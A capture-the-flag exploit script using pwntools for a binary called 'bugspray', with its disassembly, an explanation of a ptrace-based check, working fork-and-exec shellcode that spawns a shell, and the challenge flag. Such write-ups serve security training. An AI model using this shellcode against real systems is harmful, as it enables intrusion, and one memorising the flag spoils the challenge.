#!/usr/bin/env python3

"""
Disassemble:

0000000000401000 <_start>:
  401000:       b8 01 00 00 00          mov    eax,0x1
  401005:       bf 01 00 00 00          mov    edi,0x1
  40100a:       48 be 00 20 40 00 00    movabs rsi,0x402000
  401011:       00 00 00
  401014:       ba 0c 00 00 00          mov    edx,0xc
  401019:       0f 05                   syscall
  40101b:       b8 09 00 00 00          mov    eax,0x9
  401020:       bf 77 77 77 00          mov    edi,0x777777
  401025:       be 2c 01 00 00          mov    esi,0x12c
  40102a:       ba 07 00 00 00          mov    edx,0x7
  40102f:       41 ba 22 00 00 00       mov    r10d,0x22
  401035:       49 c7 c0 ff ff ff ff    mov    r8,0xffffffffffffffff
  40103c:       41 b9 00 00 00 00       mov    r9d,0x0
  401042:       0f 05                   syscall
  401044:       41 bc 64 00 00 00       mov    r12d,0x64

000000000040104a <loop>:
  40104a:       49 ff c2                inc    r10
  40104d:       4d 39 e2                cmp    r10,r12
  401050:       75 f8                   jne    40104a <loop>
  401052:       b8 00 00 00 00          mov    eax,0x0
  401057:       bf 00 00 00 00          mov    edi,0x0
  40105c:       be 77 77 77 00          mov    esi,0x777777
  401061:       ba f4 01 00 00          mov    edx,0x1f4
  401066:       0f 05                   syscall
  401068:       48 83 c0 20             add    rax,0x20
  40106c:       41 bb 66 00 00 00       mov    r11d,0x66
  401072:       4c 39 d0                cmp    rax,r10
  401075:       7c 23                   jl     40109a <bugspray>
  401077:       4c 39 d8                cmp    rax,r11
  40107a:       7d 1e                   jge    40109a <bugspray>
  40107c:       bf 00 00 00 00          mov    edi,0x0
  401081:       be 00 00 00 00          mov    esi,0x0
  401086:       ba 00 00 00 00          mov    edx,0x0
  40108b:       0f 05                   syscall
  40108d:       48 85 c0                test   rax,rax
  401090:       74 16                   je     4010a8 <off>
  401092:       48 31 c0                xor    rax,rax
  401095:       b9 64 00 00 00          mov    ecx,0x64

000000000040109a <bugspray>:
  40109a:       48 ff c0                inc    rax
  40109d:       68 da ca c1 00          push   0xc1cada
  4010a2:       48 39 c8                cmp    rax,rcx
  4010a5:       7c f3                   jl     40109a <bugspray>
  4010a7:       c3                      ret

00000000004010a8 <off>:
  4010a8:       48 31 d2                xor    rdx,rdx
  4010ab:       ba 77 77 77 00          mov    edx,0x777777
  4010b0:       ff e2                   jmp    rdx

This code is requesting user input, checking that input to see if its at least 0x44 bytes 
and no bigger than 0x45 bytes.  The value of rax gets 0x20 added to it after this, and is used
in a syscall which means that we can call either 0x64 (times) or 0x65 (ptrace).

We need the return code from the syscall to be 0, so we can call ptrace with all null
parameters, which will appear like ptrace(PTRACE_TRACEME, 0, 0, 0); to the kernel.

Once that is done, the program will jump to our input as if it is shellcode.  So we can
write 0x45 bytes of shellcode to launch a shell.  The only issue is that beacuse we called
ptrace on our own program, now we are effectively debugging our own program and cannot
inspect with gdb or make exec calls in our program.  The solution is to first call a fork
with the shellcode to create a child and then call exec to get a shell.

To get around the no debugging, we simply can set rax to 0 manually in gdb, but we have
to still test without gdb to make sure it works later.

sun{mosquitos_and_horseflies_and_triangle_bugs_oh_my}
"""

from pwn import *


exe = ELF("./bugspray_patched")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    elif False:
        r = gdb.debug(BINARY, gdbscript = '''
                       b *loop+67
        ''')
    else:
        r = process(BINARY)

    return r


def main():
    r = conn()

    log.progress("Exploiting")

    context.update(arch = 'amd64', os = 'linux')

    payload = b''
    # Call fork() to spawn a child
    payload += asm("mov rax, 0x39")
    payload += asm("syscall")

    # Pop a shell
    payload += asm("push   0x42")
    payload += asm("pop    rax")
    payload += asm("inc    ah")
    payload += asm("cqo")
    payload += asm("push   rdx")
    payload += asm("movabs rdi, 0x68732f2f6e69622f")
    payload += asm("push   rdi")
    payload += asm("push   rsp")
    payload += asm("pop    rsi")
    payload += asm("mov    r8, rdx")
    payload += asm("mov    r10, rdx")
    payload += asm("syscall")

    # Log our payload length for debugging
    log.progress("Payload length: ", len(payload))

    # pad our payload to 0x45 bytes
    payload += asm("nop") * (0x45 - len(payload))

    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()
